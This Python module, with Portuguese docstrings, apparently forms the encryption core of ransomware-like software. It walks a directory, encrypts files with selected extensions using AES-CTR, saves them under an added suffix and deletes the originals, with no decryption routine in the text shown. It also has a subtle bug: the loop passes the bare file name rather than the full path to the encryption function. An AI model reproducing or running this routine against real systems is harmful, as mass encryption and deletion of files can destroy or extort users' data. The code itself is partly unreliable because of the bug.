import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from tqdm import tqdm
from .file_management import clear
from .file_management import check_permissions, list_files
from .logging import log

def encryption(file_path, crypto_key, suffix):
  """
  Criptografa um arquivo e salva com o sufixo especificado.

  :param file_path: Caminho do arquivo a ser criptografado.
  :param crypto_key: Chave para criptografar.
  :param suffix: Sufixo para adicionar ao final do nome do arquivo a ser criptografado.
  """

  try:
    # Gerar um nonce aleatorio para o CTR
    nonce = get_random_bytes(8)
    # Criar uma Cifra AES no modo CTR
    cipher = AES.new(crypto_key, AES.MODE_CTR, nonce=nonce)

    # Abrir o arquivo original
    with open(file_path, 'rb') as f:
      data = f.read()
    
    # Criptografar os dados
    encrypted_data = cipher.encrypt(data)
    # Salvar os dados criptografados no arquivo com sufixo
    new_file_name = file_path + suffix

    with open(new_file_name, 'wb') as f:
      f.write(nonce + encrypted_data)
    
    if os.path.exists(new_file_name):
      # Remover o arquivo original
      os.remove(file_path)
  except Exception as e:
    log(f"Error encrypting the file '{file_path}': {e}", level="error")


def encrypt_files(directory, crypto_key, suffix, valid_extensions):
  """
  Criptografa todos os arquivos no diretorio atual com o sufixo especificado.

  :param dir: Caminho do diretorio a ser definido.
  :param crypto_key: Chave para criptografar.
  :param suffix: Sufixo para adicionar ao final do nome do arquivo a ser criptografado.
  :param valid_extensions: Lista de extenções de arquivos válidos.
  """

  clear()
  files = list_files(directory, valid_extensions)

  if not files:
    log("No files found to encrypt.", level="info")
    return
  
  log("Processing file encryption:", level="processing")
  for file in tqdm(files, desc="Encrypting files"):
    file_path = os.path.join(directory, file)

    if check_permissions(file_path):
      encryption(file, crypto_key, suffix)
    else:
      log(f"Skipping file due to insufficient permissions: {file}", level="error")
  
  log(f"All files have been successfully encrypted.", level="success")
